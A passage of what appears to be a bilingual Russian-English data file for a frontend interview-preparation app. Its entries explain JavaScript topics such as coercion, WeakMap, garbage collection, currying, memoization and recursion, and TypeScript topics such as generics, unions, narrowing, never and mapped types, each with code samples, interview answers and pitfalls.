          interviewQuestion: "Почему NaN === NaN возвращает false, и как правильно проверить значение на NaN?",
          interviewAnswerRu:
            "Это поведение задано стандартом IEEE 754 для чисел с плавающей точкой: NaN определён как значение, не равное ничему, включая само себя — это позволяет отличить 'настоящий NaN' от любого другого числа через сравнение на равенство. Правильная проверка — Number.isNaN(value), которая не делает приведение типов, в отличие от глобальной isNaN(value).",
          interviewAnswerEn:
            "This is defined by the IEEE 754 floating-point standard: NaN is specified as not equal to anything, including itself — which is actually how you can reliably detect 'a real NaN' via an equality check gone wrong. The correct check is Number.isNaN(value), which does no type coercion, unlike the global isNaN(value).",
          pitfalls: [
            "Использовать глобальный isNaN() вместо Number.isNaN() и получать ложные срабатывания на строках.",
            "Пытаться сравнивать с NaN через === вместо Number.isNaN() или value !== value.",
          ],
        },
      },
      {
        id: "js-coercion",
        title: "Coercion",
        content: {
          title: "Type Coercion (приведение типов)",
          shortExplanation:
            "Coercion — автоматическое или явное преобразование значения из одного типа в другой (например, строки в число), которое JS выполняет очень охотно благодаря своей динамической типизации.",
          detailedExplanation:
            "Неявное приведение типов происходит в операторах вроде + (который выбирает между конкатенацией строк и сложением чисел в зависимости от типов операндов), в сравнениях == (в отличие от строгого ===), и в условиях if (значение приводится к boolean по правилам truthy/falsy). Falsy-значения в JS — это ровно 0, '', null, undefined, NaN и false; всё остальное, включая пустой массив [] и пустой объект {}, — truthy, что часто удивляет новичков. Явное приведение (String(value), Number(value), Boolean(value), либо более короткие идиомы вроде +value или !!value) считается хорошей практикой, потому что делает намерение разработчика видимым в коде, а не скрытым в правилах движка.",
          codeExample:
            "'5' + 3;    // '53' — конкатенация строк\n'5' - 3;    // 2  — '-' не работает со строками, поэтому идёт числовое приведение\n[] == false; // true — оба приводятся к 0 при сравнении\nif ([]) console.log('truthy!'); // выполнится — пустой массив truthy",
          interviewQuestion: "Почему '5' + 3 даёт '53', а '5' - 3 даёт 2?",
          interviewAnswerRu:
            "Оператор + перегружен: если хотя бы один операнд — строка, JS выполняет конкатенацию, приводя второй операнд к строке. Оператор - существует только для чисел, поэтому в этом случае JS вместо конкатенации приводит строку к числу и выполняет вычитание. Это классический пример того, что разные операторы по-разному решают, в какую сторону приводить типы.",
          interviewAnswerEn:
            "The + operator is overloaded: if either operand is a string, JS performs string concatenation, coercing the other operand to a string. The - operator only exists for numbers, so in that case JS coerces the string to a number instead and performs subtraction. It's a classic example of different operators resolving coercion in different directions.",
          pitfalls: [
            "Полагаться на неявное приведение в сравнениях (==) вместо строгого === там, где типы должны совпадать.",
            "Забывать, что [] и {} — truthy, и писать условия вроде if (emptyArray), ожидая false.",
          ],
        },
      },
      {
        id: "js-map-set-weakmap-weakset",
        title: "Map / Set / WeakMap / WeakSet",
        content: {
          title: "Map / Set / WeakMap / WeakSet",
          shortExplanation:
            "Map хранит пары ключ-значение с ключами любого типа (в отличие от обычного объекта, где ключи всегда приводятся к строке); Set хранит уникальные значения; WeakMap/WeakSet — их 'слабые' версии, которые не мешают сборщику мусора удалить объект-ключ.",
          detailedExplanation:
            "В обычном объекте {} ключом может быть только строка или Symbol — число или объект в качестве ключа будет приведён к строке ('[object Object]' для любого объекта, что стирает уникальность). Map решает это: ключом может быть объект, функция, DOM-узел — что угодно, и порядок вставки сохраняется при переборе. WeakMap/WeakSet принимают в качестве ключей только объекты и не удерживают их от сборки мусора: если единственная оставшаяся ссылка на объект — это ключ в WeakMap, сборщик мусора всё равно может его удалить, а WeakMap автоматически 'забудет' эту запись. Именно поэтому WeakMap/WeakSet нельзя перебрать (нет .keys()/.forEach() в привычном виде) — их содержимое непредсказуемо меняется в любой момент сборкой мусора, и такой API мог бы дать недетерминированный результат.",
          codeExample:
            "const cache = new WeakMap();\nfunction getExpensiveResult(obj) {\n  if (cache.has(obj)) return cache.get(obj);\n  const result = computeExpensive(obj);\n  cache.set(obj, result); // если obj удалят отовсюду, запись в cache уйдёт вместе с ним\n  return result;\n}",
          interviewQuestion: "Зачем нужен WeakMap, если можно использовать обычный Map?",
          interviewAnswerRu:
            "Обычный Map удерживает сильную ссылку на ключ — пока запись в Map жива, сборщик мусора не может удалить объект-ключ, даже если больше нигде на него нет ссылок, что может привести к утечке памяти для долгоживущих кешей. WeakMap хранит слабую ссылку: если на объект-ключ больше нет других ссылок, он будет собран сборщиком мусора вместе с соответствующей записью в WeakMap — это делает WeakMap подходящим инструментом именно для кешей и метаданных, привязанных к объектам, время жизни которых WeakMap не должен продлевать.",
          interviewAnswerEn:
            "A regular Map holds a strong reference to its keys — as long as an entry exists in the Map, the garbage collector can't reclaim the key object even if nothing else references it, which can leak memory in long-lived caches. WeakMap holds a weak reference: once nothing else references the key object, it can be garbage collected along with its WeakMap entry — making WeakMap the right tool for caches and metadata that shouldn't extend an object's lifetime.",
          pitfalls: [
            "Использовать обычный объект {} как Map с динамическими ключами и не следить за прототипными ключами (__proto__ и подобные).",
            "Пытаться перебрать WeakMap/WeakSet циклом — они намеренно не итерируемы.",
          ],
        },
      },
      {
        id: "js-garbage-collection",
        title: "Garbage Collection",
        content: {
          title: "Garbage Collection (сборка мусора)",
          shortExplanation:
            "Garbage collection — автоматический механизм V8 (и других движков), который освобождает память, занятую объектами, до которых больше не может дотянуться ни одна активная ссылка из кода.",
          detailedExplanation:
            "Основной алгоритм — mark-and-sweep: сборщик мусора стартует от 'корней' (глобальные объекты, стек вызовов, замкнутые переменные активных функций) и помечает всё, до чего можно дотянуться по цепочке ссылок как 'достижимое' (reachable); всё остальное считается мусором и освобождается. Важно, что 'достижимость', а не количество ссылок, определяет, будет ли объект удалён — поэтому два объекта, ссылающиеся друг на друга по кругу, но не достижимые снаружи, всё равно будут корректно собраны (в отличие от простого подсчёта ссылок, где circular reference — известная проблема). Типичные источники утечек памяти во фронтенде: незакрытые подписки на события (addEventListener без соответствующего removeEventListener), таймеры, которые никогда не очищаются, и замыкания, удерживающие ссылки на большие объекты дольше, чем нужно.",
          codeExample:
            "function setupWidget(el) {\n  const bigData = loadHugeDataset();\n  const handler = () => console.log(bigData.length);\n  el.addEventListener('click', handler);\n  // Если забыть removeEventListener при удалении el из DOM,\n  // handler (и bigData вместе с ним через замыкание) не будет собран,\n  // пока жив сам обработчик события.\n  return () => el.removeEventListener('click', handler); // cleanup — обязателен\n}",
          interviewQuestion: "Какие типичные паттерны во фронтенд-коде приводят к утечкам памяти?",
          interviewAnswerRu:
            "Чаще всего это: обработчики событий, добавленные через addEventListener, но никогда не снятые через removeEventListener (особенно на глобальных объектах вроде window); setInterval/setTimeout, которые не очищаются при размонтировании компонента; и замыкания, которые случайно удерживают ссылку на большие структуры данных дольше, чем те реально нужны. В React это чаще всего решается через return-функцию очистки внутри useEffect.",
          interviewAnswerEn:
            "The usual suspects are: event listeners added via addEventListener but never removed via removeEventListener (especially on global objects like window); setInterval/setTimeout that aren't cleared when a component unmounts; and closures that accidentally keep a reference to large data structures longer than actually needed. In React, this is most often fixed with a cleanup function returned from useEffect.",
          pitfalls: [
            "Забывать снимать подписки/таймеры при размонтировании компонента — классическая причина утечек в SPA.",
            "Считать, что достаточно 'обнулить' одну ссылку — если объект всё ещё достижим по другому пути, он не будет собран.",
          ],
        },
      },
      {
        id: "js-debounce-throttle-concept",
        title: "Debounce / Throttle (концепция)",
        content: {
          title: "Debounce / Throttle: в чём разница",
          shortExplanation:
            "Debounce откладывает вызов функции до тех пор, пока события не перестанут поступать в течение заданного интервала; throttle гарантирует, что функция вызывается не чаще, чем раз в заданный интервал, независимо от того, как часто приходят события.",
          detailedExplanation:
            "Debounce полезен, когда важен только 'финальный' вызов после серии событий — например, поиск по мере ввода текста: не нужно слать запрос на каждое нажатие клавиши, достаточно отправить его один раз, когда пользователь на мгновение остановился печатать. Throttle полезен, когда события идут непрерывным потоком и важно ограничить частоту реакции, но не пропустить её полностью — например, обработчик scroll или resize, где нужно обновлять UI не на каждый пиксель прокрутки, а, скажем, не чаще 10 раз в секунду. Готовые реализации обоих паттернов и разбор их внутреннего устройства — в разделе Live Coding / Practice Tasks (useDebounce, useThrottle).",
          codeExample:
            "// Debounce: сбрасывает таймер при каждом новом вызове\nfunction debounce(fn, delay) {\n  let timer;\n  return (...args) => {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn(...args), delay);\n  };\n}\n\n// Throttle: не даёт вызывать чаще, чем раз в delay\nfunction throttle(fn, delay) {\n  let last = 0;\n  return (...args) => {\n    const now = Date.now();\n    if (now - last >= delay) { last = now; fn(...args); }\n  };\n}",
          interviewQuestion: "Приведите пример, где нужен debounce, и пример, где throttle — и объясните разницу.",
          interviewAnswerRu:
            "Debounce — для автокомплита поиска: нужен только последний введённый текст, все промежуточные символы можно игнорировать, пока пользователь печатает. Throttle — для обработчика scroll, который обновляет прогресс-бар чтения статьи: события scroll идут постоянно, но обновлять UI достаточно с фиксированной частотой, не реже и не чаще заданного интервала, не дожидаясь полной остановки прокрутки.",
          interviewAnswerEn:
            "Debounce fits a search autocomplete: only the final typed text matters, so every intermediate keystroke can be ignored while the user is still typing. Throttle fits a scroll handler updating a reading-progress bar: scroll events fire continuously, but the UI only needs to update at a fixed rate, not waiting for scrolling to fully stop.",
          pitfalls: [
            "Использовать debounce там, где нужна регулярная промежуточная реакция (пользователь не увидит вообще никакого отклика, пока не остановится).",
            "Использовать throttle там, где важен именно финальный вызов — можно потерять последнее событие, если не добавить trailing call.",
          ],
        },
      },
      {
        id: "js-currying",
        title: "Currying",
        content: {
          title: "Currying (каррирование)",
          shortExplanation:
            "Currying — техника преобразования функции с несколькими аргументами в последовательность функций, каждая из которых принимает один аргумент и возвращает следующую функцию.",
          detailedExplanation:
            "Каррированная функция add(a)(b)(c) вместо add(a, b, c) позволяет создавать частично применённые ('specialized') версии функции, фиксируя часть аргументов заранее — например, add(5) вернёт функцию, которая всегда прибавляет 5 к своему аргументу, что удобно для передачи в map/filter или для конфигурации переиспользуемых обработчиков. В основе каррирования лежат обычные замыкания: каждая промежуточная функция 'запоминает' уже переданные аргументы в своём лексическом окружении. На практике каррирование часто путают с более широким понятием partial application (частичного применения) — currying всегда превращает функцию в цепочку функций от одного аргумента, тогда как partial application может фиксировать несколько аргументов сразу, не требуя строго 'по одному'.",
          codeExample:
            "const curry = (fn) => (...args) =>\n  args.length >= fn.length\n    ? fn(...args)\n    : (...more) => curry(fn)(...args, ...more);\n\nconst add3 = (a, b, c) => a + b + c;\nconst curriedAdd = curry(add3);\n\ncurriedAdd(1)(2)(3);   // 6\ncurriedAdd(1, 2)(3);   // 6 — тоже работает\ncurriedAdd(1, 2, 3);   // 6 — и так тоже",
          interviewQuestion: "Зачем каррирование полезно на практике, а не только как академическое упражнение?",
          interviewAnswerRu:
            "Каррирование позволяет создавать специализированные версии универсальных функций без написания новой функции с нуля — например, из общей validate(schema, value) сделать validateUser = validate(userSchema), которую дальше можно переиспользовать как обычную функцию от одного аргумента. Это особенно удобно в функциональном стиле, когда функции передаются как значения в map/filter/reduce или в конфигурацию (например, в селекторы стейт-менеджеров).",
          interviewAnswerEn:
            "Currying lets you create specialized versions of general-purpose functions without writing a new function from scratch — for instance, turning a general validate(schema, value) into validateUser = validate(userSchema), which you can then reuse as a plain one-argument function. This is especially handy in a functional style, where functions get passed around as values into map/filter/reduce or into configuration (like selectors in state managers).",
          pitfalls: [
            "Каррировать функции с переменным числом аргументов (rest-параметрами) — fn.length их не учитывает, и автоматическое каррирование через fn.length ломается.",
            "Злоупотреблять каррированием там, где обычная функция с несколькими параметрами читалась бы проще.",
          ],
        },
      },
      {
        id: "js-memoization-concept",
        title: "Memoization (концепция)",
        content: {
          title: "Memoization: концепция и ручная реализация",
          shortExplanation:
            "Memoization — оптимизация, при которой результат вызова чистой функции кешируется по её аргументам, чтобы при повторном вызове с теми же аргументами не пересчитывать его заново.",
          detailedExplanation:
            "Мемоизация применима только к чистым функциям (pure functions) — тем, чей результат зависит исключительно от аргументов и не имеет побочных эффектов, иначе закешированный результат может стать некорректным. Ключ кеша обычно строится из сериализованных аргументов (например, JSON.stringify(args) для простых значений) — для объектов и функций в качестве аргументов такой подход не работает напрямую, и вместо обычного объекта-кеша часто используют WeakMap, чтобы кеш автоматически 'забывал' о неиспользуемых больше объектах-ключах. В React мемоизация встроена как первичный примитив в виде useMemo/useCallback/React.memo — они решают ту же задачу 'не пересчитывать одно и то же повторно', но применительно к рендерам компонентов, а не к произвольным функциям.",
          codeExample:
            "function memoize(fn) {\n  const cache = new Map();\n  return (...args) => {\n    const key = JSON.stringify(args);\n    if (cache.has(key)) return cache.get(key);\n    const result = fn(...args);\n    cache.set(key, result);\n    return result;\n  };\n}\n\nconst slowSquare = (n) => { /* тяжёлые вычисления */ return n * n; };\nconst fastSquare = memoize(slowSquare);\nfastSquare(5); // считает\nfastSquare(5); // берёт из кеша",
          interviewQuestion: "Почему мемоизацию нельзя применять к нечистым функциям?",
          interviewAnswerRu:
            "Потому что мемоизация предполагает, что одни и те же аргументы всегда дают один и тот же результат — это верно только для чистых функций. Если функция читает внешнее изменяемое состояние или делает сетевой запрос, закешированный результат может устареть или быть просто неверным для текущего вызова, а пользователь получит 'старые' данные под видом актуальных.",
          interviewAnswerEn:
            "Because memoization assumes the same arguments always produce the same result — which only holds for pure functions. If a function reads external mutable state or makes a network call, the cached result can go stale or simply be wrong for the current call, and the caller silently gets outdated data disguised as fresh.",
          pitfalls: [
            "Мемоизировать функцию с побочными эффектами или зависимостью от внешнего изменяемого состояния.",
            "Использовать простой Map как кеш без ограничения размера — при большом разнообразии аргументов это становится утечкой памяти.",
          ],
        },
      },
      {
        id: "js-recursion",
        title: "Recursion",
        content: {
          title: "Recursion (рекурсия)",
          shortExplanation:
            "Рекурсия — техника, при которой функция вызывает саму себя для решения более мелкой версии той же задачи, пока не будет достигнут базовый случай (base case), останавливающий дальнейшие вызовы.",
          detailedExplanation:
            "Любая корректная рекурсивная функция должна иметь два элемента: базовый случай (условие, при котором функция возвращает результат без дальнейшего рекурсивного вызова) и рекурсивный случай (вызов самой себя с 'уменьшенной' версией входных данных, приближающей к базовому случаю). Рекурсия особенно естественна для структур, которые сами по себе рекурсивны — деревьев (DOM, дерево компонентов, вложенные категории), связных списков, обхода вложенных объектов произвольной глубины. В JavaScript у рекурсии есть практическое ограничение — размер call stack: очень глубокая рекурсия (десятки тысяч вложенных вызовов) приведёт к переполнению стека, и в таких случаях предпочтительнее итеративное решение с явным стеком/очередью либо (в языках, поддерживающих её) хвостовая рекурсия — в JS хвостовая рекурсия не оптимизируется движками, несмотря на то что формально включена в спецификацию ES6.",
          codeExample:
            "function sumTree(node) {\n  if (!node) return 0; // базовый случай\n  return node.value + node.children.reduce((sum, child) => sum + sumTree(child), 0);\n}\n\n// Классический пример с накоплением через дополнительный параметр\nfunction factorial(n, acc = 1) {\n  if (n <= 1) return acc; // базовый случай\n  return factorial(n - 1, acc * n); // рекурсивный случай\n}",
          interviewQuestion: "Когда рекурсивное решение предпочтительнее итеративного, и когда — наоборот?",
          interviewAnswerRu:
            "Рекурсия предпочтительнее для естественно рекурсивных структур (деревья, вложенные объекты произвольной глубины), где она делает код короче и понятнее, отражая саму структуру данных. Итеративное решение предпочтительнее, когда ожидаемая глубина велика и есть риск переполнения стека, либо когда важна производительность и не хочется платить за накладные расходы на создание множества стековых кадров — в JS движки не оптимизируют хвостовую рекурсию, поэтому 'превратить рекурсию в цикл руками' — реальный практический приём, а не теоретическое упражнение.",
          interviewAnswerEn:
            "Recursion is preferable for naturally recursive structures (trees, arbitrarily nested objects), where it keeps the code short and mirrors the data's own structure. An iterative solution is preferable when the expected depth is large and stack overflow is a real risk, or when performance matters and you don't want to pay the overhead of many stack frames — JS engines don't optimize tail recursion, so manually converting recursion into a loop is a genuine practical technique, not just a theoretical exercise.",
          pitfalls: [
            "Забыть или неверно определить базовый случай — бесконечная рекурсия до переполнения стека.",
            "Использовать глубокую рекурсию для обхода потенциально очень больших структур (например, произвольного JSON с сервера) без учёта лимита стека.",
          ],
        },
      },

    ],
  },


  // ---------------------------------------------------------------------
  // TYPESCRIPT
  // ---------------------------------------------------------------------
  {
    id: "typescript",
    title: "TypeScript",
    subtopics: [
      {
        id: "ts-generics",
        title: "Generics",
        content: {
          title: "Generics (обобщённые типы)",
          shortExplanation:
            "Generics позволяют писать функции, типы и компоненты, которые работают с разными типами данных, сохраняя типовую безопасность.",
          detailedExplanation:
            "Вместо того чтобы писать отдельную функцию для каждого типа данных или использовать any (теряя проверку типов), generics вводят 'типовой параметр' — например <T> — который подставляется реальным типом в месте вызова. TypeScript выводит T автоматически из аргументов, но его также можно указать явно. Generics широко используются в React (например, useState<T>()), в утилитах массивов, в API-клиентах. Ограничения через extends (например, <T extends { id: string }>) позволяют требовать от типового параметра минимальный набор свойств, сохраняя при этом гибкость: функция продолжает принимать любой тип, у которого точно есть id, вместо того чтобы фиксировать один конкретный интерфейс. Часто generic-параметров бывает несколько сразу — как в примере с groupBy ниже, где T описывает тип элемента массива, а K — тип ключа группировки, и TypeScript связывает их между собой через сигнатуру функции getKey: (item: T) => K. Значения по умолчанию для generic-параметров (<T = string>) полезны в компонентах и утилитах, которые в большинстве случаев используются с одним и тем же типом, но должны оставлять возможность переопределить его явно. Важно отличать generic-функцию от функции, принимающей union всех возможных типов: union заставляет писать одну и ту же логику ветвления для каждого варианта, тогда как generic пишет логику один раз и лишь параметризует тип, сохраняя связь между входом и выходом для каждого конкретного вызова.",
          codeExample:
            "function first<T>(arr: T[]): T | undefined {\n  return arr[0];\n}\n\nconst num = first([1, 2, 3]); // number | undefined\nconst str = first(['a', 'b']); // string | undefined",
          interviewQuestion: "Зачем нужны generics, если можно использовать any?",
          interviewAnswerRu:
            "any полностью отключает проверку типов — компилятор перестаёт помогать. Generics сохраняют связь между входными и выходными типами: если в функцию передали number[], TypeScript знает, что вернётся number | undefined, а не any. Это даёт автодополнение и защиту от ошибок при использовании результата.",
          interviewAnswerEn:
            "any disables type checking entirely — the compiler stops helping you. Generics preserve the relationship between input and output types: if you pass in a number[], TypeScript knows the return type is number | undefined, not any. That gives you autocomplete and error checking wherever the result is used.",
          pitfalls: [
            "Использовать generic там, где подошёл бы простой конкретный тип — усложняет чтение без пользы.",
            "Путать generic-параметр с any, когда ограничения (extends) не заданы.",
          ],
          practiceTask:
            "Напишите generic-функцию groupBy<T, K extends string | number>(items: T[], getKey: (item: T) => K): Record<K, T[]>.",
          resources: {
            docs: [
              { title: "Generics — TypeScript Handbook", url: "https://www.typescriptlang.org/docs/handbook/2/generics.html" },
            ],
            articles: [
              { title: "Generics (TypeScript Deep Dive, Basarat)", url: "https://basarat.gitbook.io/typescript/type-system/generics" },
              { title: "Generic Parameter Defaults in TypeScript (Marius Schulz)", url: "https://mariusschulz.com/blog/generic-parameter-defaults-in-typescript" },
            ],
          },
        },
      },
      {
        id: "ts-union-types",
        title: "Union Types",
        content: {
          title: "Union Types (объединённые типы)",
          shortExplanation:
            "Union type — это тип, значение которого может быть одним из нескольких перечисленных типов, например string | number.",
          detailedExplanation:
            "Union types (A | B) описывают значение, которое реально может принимать разные формы — типичный пример: результат запроса { status: 'loading' } | { status: 'success', data: T } | { status: 'error', error: string }. TypeScript заставляет вас проверить, какой именно вариант перед вами (через narrowing), прежде чем обращаться к полям, специфичным для одного из вариантов. Union из объектов с общим полем-дискриминатором (в примере ниже — status) называют discriminated union, и это самый практичный вид union в реальном коде: TypeScript умеет сужать весь объект целиком по одному сравнению этого поля, а не проверять каждое свойство по отдельности. Union можно строить и из примитивов (string | number), и из литеральных значений ('idle' | 'loading' | 'error'), и здесь стоит подчеркнуть разницу с пересечением типов (intersection, A & B): union — это 'одно из', а intersection — 'всё сразу', и их часто путают именно из-за похожего синтаксиса с одним отличающимся символом. При обращении к общему для всех вариантов union полю TypeScript не требует narrowing — проблема возникает только с полями, которые есть не во всех вариантах. На практике discriminated union — это типобезопасная замена паттерна 'один большой объект с кучей необязательных полей и неявными правилами, какие поля с какими сочетаются', которая исключает целый класс ошибок в духе 'а что если result.data есть, а result.status при этом error'.",
          codeExample:
            "type Result =\n  | { status: 'loading' }\n  | { status: 'success'; data: string }\n  | { status: 'error'; error: string };\n\nfunction render(result: Result) {\n  if (result.status === 'success') {\n    return result.data; // TS знает, что data есть\n  }\n}",
          interviewQuestion: "Чем union type отличается от enum?",
          interviewAnswerRu:
            "Union type из строковых литералов ('a' | 'b') существует только на уровне типов и не создаёт рантайм-объект, в то время как enum генерирует реальный JS-объект (кроме const enum). Для большинства случаев в React/TS-проектах предпочитают union из строковых литералов — они проще, легче сериализуются и лучше работают с discriminated unions.",
          interviewAnswerEn:
            "A string literal union ('a' | 'b') exists only at the type level and produces no runtime object, whereas a regular enum compiles to an actual JS object (except const enum). In most React/TS codebases string literal unions are preferred — they're simpler, serialize cleanly, and work well with discriminated unions.",
          pitfalls: [
            "Забывать обработать один из вариантов union — TypeScript подскажет через exhaustiveness check с never.",
            "Делать слишком широкие union (string | number | boolean | object), теряя смысл типа.",
          ],
          practiceTask:
            "Опишите discriminated union для формы Shape = Circle | Square | Rectangle и напишите функцию area(shape: Shape): number с полным разбором через switch.",
          resources: {
            docs: [
              { title: "Everyday Types: Union Types — TypeScript Handbook", url: "https://www.typescriptlang.org/docs/handbook/2/everyday-types.html" },
            ],
            articles: [
              { title: "Tagged Union Types in TypeScript (Marius Schulz)", url: "https://mariusschulz.com/blog/tagged-union-types-in-typescript" },
              { title: "Discriminated Unions (TypeScript Deep Dive, Basarat)", url: "https://basarat.gitbook.io/typescript/type-system/discriminated-unions" },
            ],
          },
        },
      },
      {
        id: "ts-narrowing",
        title: "Narrowing",
        content: {
          title: "Narrowing (сужение типов)",
          shortExplanation:
            "Narrowing — это процесс, при котором TypeScript уточняет (сужает) широкий тип до более конкретного на основе проверок в коде.",
          detailedExplanation:
            "TypeScript анализирует условия — typeof, instanceof, in, сравнение с литералом, кастомные type guard функции (value is Type) — и внутри соответствующей ветки кода 'сужает' тип переменной. Это позволяет безопасно работать с union types без явных приведений типов (as). Narrowing работает не только на параметрах функций, но и на любых переменных, доступных в замкнутой области видимости, — включая свойства объектов и элементы массивов, если TypeScript может доказать, что между проверкой и использованием значение не могло измениться (например, через другую функцию с побочным эффектом). Именно поэтому промежуточное присваивание в отдельную const-переменную иногда помогает компилятору 'не терять' сужение: если проверять obj.value, а не заранее сохранённую const value = obj.value, TypeScript может решить, что value — это геттер, который мог измениться между проверкой и использованием, и откажется сужать тип. Кастомные type guard функции (value is Type) особенно полезны там, где встроенных операторов недостаточно — например, для проверки формы произвольного объекта, пришедшего с сервера как unknown, где typeof и instanceof не помогают различить конкретную форму данных. В отличие от приведения типов через as, которое лишь 'обещает' компилятору, что тип такой, каким вы сказали (и может быть неправдой в рантайме), правильно написанный type guard реально проверяет условие в рантайме, поэтому его сужение безопаснее и не может 'соврать' компилятору.",
          codeExample:
            "function printLength(value: string | string[]) {\n  if (Array.isArray(value)) {\n    console.log(value.length); // value: string[]\n  } else {\n    console.log(value.length); // value: string\n  }\n}\n\nfunction isString(v: unknown): v is string {\n  return typeof v === 'string';\n}",
          interviewQuestion: "Как TypeScript понимает, что внутри if переменная стала конкретного типа?",
          interviewAnswerRu:
            "TypeScript анализирует поток управления (control flow analysis) и связывает конкретные проверки — typeof, instanceof, in, сравнение с литералом или пользовательский type guard — с сужением типа внутри блока, где условие истинно. Это статический анализ на этапе компиляции, в рантайме TS-типов не существует.",
          interviewAnswerEn:
            "TypeScript performs control flow analysis and associates specific checks — typeof, instanceof, in, literal comparisons, or a custom type guard — with narrowing the type inside the branch where the condition holds. This is purely a compile-time static analysis; there are no types left at runtime.",
          pitfalls: [
            "Полагаться на as вместо настоящего narrowing — компилятор перестаёт реально проверять корректность.",
            "Забывать, что narrowing 'ломается', если между проверкой и использованием переменная переприсваивается через замыкание.",
          ],
          practiceTask:
            "Напишите type guard isError(value: unknown): value is Error и используйте его в try/catch блоке для безопасного доступа к error.message.",
          resources: {
            docs: [
              { title: "Narrowing — TypeScript Handbook", url: "https://www.typescriptlang.org/docs/handbook/2/narrowing.html" },
            ],
            articles: [
              { title: "Discriminated Unions (TypeScript Deep Dive, Basarat)", url: "https://basarat.gitbook.io/typescript/type-system/discriminated-unions" },
            ],
          },
        },
      },
      {
        id: "ts-never",
        title: "never",
        content: {
          title: "never",
          shortExplanation:
            "never — тип, который означает 'значение, которого никогда не будет': функция никогда не завершится нормально, либо ветка кода недостижима.",
          detailedExplanation:
            "never используется в двух основных случаях: для функций, которые всегда бросают исключение или уходят в бесконечный цикл (function fail(): never { throw new Error() }), и для проверки исчерпывающей обработки (exhaustiveness check) в union types — если после обработки всех вариантов switch остаётся значение типа never, значит все случаи покрыты. Если позже добавить новый вариант в union и забыть обработать его, TypeScript покажет ошибку именно в месте с never. never занимает особое место в иерархии типов: это 'нижний' тип (bottom type), который является подтипом абсолютно любого другого типа — поэтому значение типа never можно присвоить переменной любого типа, но не наоборот (никакое другое значение нельзя присвоить переменной типа never, кроме самого never). Это же свойство делает never 'поглощающим' элементом в union: тип A | never всегда упрощается компилятором обратно до A, потому что never буквально не добавляет ни одного возможного значения к объединению. В функциях, возвращающих never, важно не путать 'функция никогда не завершается нормально' с 'функция ничего не возвращает' — например, функция, которая логирует ошибку и возвращает undefined, имеет тип void, а не never, даже если по сути она 'ничего полезного не делает'. Паттерн с exhaustiveness check особенно ценен в командной разработке: если через полгода коллега добавит новый вариант в union где-то в другом файле, компилятор сам укажет на все места, где switch по этому union нужно дополнить — вместо того чтобы полагаться на то, что кто-то не забудет вручную найти все такие switch по всему проекту.",
          codeExample:
            "type Shape = { kind: 'circle' } | { kind: 'square' };\n\nfunction area(shape: Shape): number {\n  switch (shape.kind) {\n    case 'circle': return 1;\n    case 'square': return 2;\n    default:\n      const _exhaustive: never = shape; // ошибка, если забыт вариант\n      throw new Error('unreachable');\n  }\n}",
          interviewQuestion: "Чем never отличается от void и почему это полезно для проверки switch?",
          interviewAnswerRu:
            "void означает 'функция ничего не возвращает', но при этом нормально завершается. never значит, что функция вообще не может завершиться нормально (бросает исключение или бесконечна), либо что тип сужен до 'ничего не осталось'. Приём с never в default-ветке switch — это способ заставить компилятор проверить, что все варианты union обработаны: если добавить новый вариант и забыть case, присвоение в never даст ошибку компиляции.",
          interviewAnswerEn:
            "void means 'the function returns nothing' but still completes normally. never means the function can never complete normally at all (it always throws or loops forever), or that a type has been narrowed down to 'nothing is left'. Assigning the switch's default value to a never-typed variable is a trick to force exhaustiveness checking: if a new union member is added and a case is missed, that assignment fails to compile.",
          pitfalls: [
            "Путать never с void в сигнатурах функций.",
            "Не использовать exhaustiveness check и получать необработанные случаи в рантайме, которые компилятор мог бы поймать.",
          ],
          practiceTask:
            "Добавьте третий вариант ('triangle') в Shape из примера и убедитесь, что компилятор ругается на строку с never, пока вы не добавите обработку.",
          resources: {
            docs: [
              { title: "Functions: the never type — TypeScript Handbook", url: "https://www.typescriptlang.org/docs/handbook/2/functions.html#never" },
            ],
            articles: [
              { title: "Narrowing: Exhaustiveness Checking — TypeScript Handbook", url: "https://www.typescriptlang.org/docs/handbook/2/narrowing.html#exhaustiveness-checking" },
              { title: "Discriminated Unions (TypeScript Deep Dive, Basarat)", url: "https://basarat.gitbook.io/typescript/type-system/discriminated-unions" },
            ],
          },
        },
      },
      {
        id: "ts-mapped-types",
        title: "Mapped Types",
        content: {
          title: "Mapped Types (маппированные типы)",
          shortExplanation:
            "Mapped types позволяют создавать новый тип, проходя по всем ключам существующего типа и трансформируя их (например, делая все поля опциональными).",
          detailedExplanation:
            "Синтаксис { [K in keyof T]: ... } перебирает все ключи типа T и применяет к каждому полю указанное преобразование. Встроенные утилитарные типы Partial<T>, Required<T>, Readonly<T>, Pick<T, K>, Record<K, V> — это именно mapped types, определённые в стандартной библиотеке TypeScript. Можно писать и свои — например, тип, который делает все поля объекта функциями-геттерами. Модификаторы внутри mapped type можно не только добавлять, но и снимать через префикс минус: -readonly и -? убирают readonly и опциональность соответственно — именно так внутри стандартной библиотеки определён Required<T> (обратный к Partial<T>), который снимает знак вопроса со всех полей вместо того, чтобы его добавлять. Key remapping через as (как в примере с Getters<T> ниже) появился в TypeScript 4.1 и позволяет не просто копировать ключи один в один, но и трансформировать их имена — например, добавлять префикс get, фильтровать часть ключей через never в позиции as (тогда ключ просто исчезает из результирующего типа), или комбинировать несколько условий. Mapped types часто комбинируют с conditional types (T extends U ? X : Y) для более тонкой трансформации каждого поля в зависимости от его собственного типа — например, чтобы обернуть в Promise только те поля, которые изначально не были функциями. Стоит подчеркнуть, что все эти преобразования происходят полностью на этапе компиляции и не порождают никакого рантайм-кода — в скомпилированном JavaScript от Partial<User> не останется и следа, в отличие от классов или enum, которые генерируют реальные объекты.",
          codeExample:
            "type User = { id: string; name: string; age: number };\n\ntype PartialUser = { [K in keyof User]?: User[K] }; // = Partial<User>\n\ntype Getters<T> = {\n  [K in keyof T as `get${Capitalize<string & K>}`]: () => T[K];\n};\n// { getId: () => string; getName: () => string; getAge: () => number }",
          interviewQuestion: "Как реализован Partial<T> внутри TypeScript и зачем это знать?",
          interviewAnswerRu:
            "Partial<T> определён как mapped type: { [P in keyof T]?: T[P] } — он проходит по всем ключам T и добавляет к каждому знак опциональности. Понимание этого механизма помогает писать собственные утилиты трансформации типов (например, сделать все поля readonly и опциональными одновременно) вместо того, чтобы вручную дублировать интерфейсы.",
          interviewAnswerEn:
            "Partial<T> is defined as a mapped type: { [P in keyof T]?: T[P] } — it iterates over every key of T and marks each one optional. Understanding this mechanism lets you write your own type-transformation utilities (e.g. making every field both readonly and optional) instead of manually duplicating interfaces.",
          pitfalls: [
            "Дублировать интерфейсы вручную для 'почти такого же' типа вместо использования mapped types.",
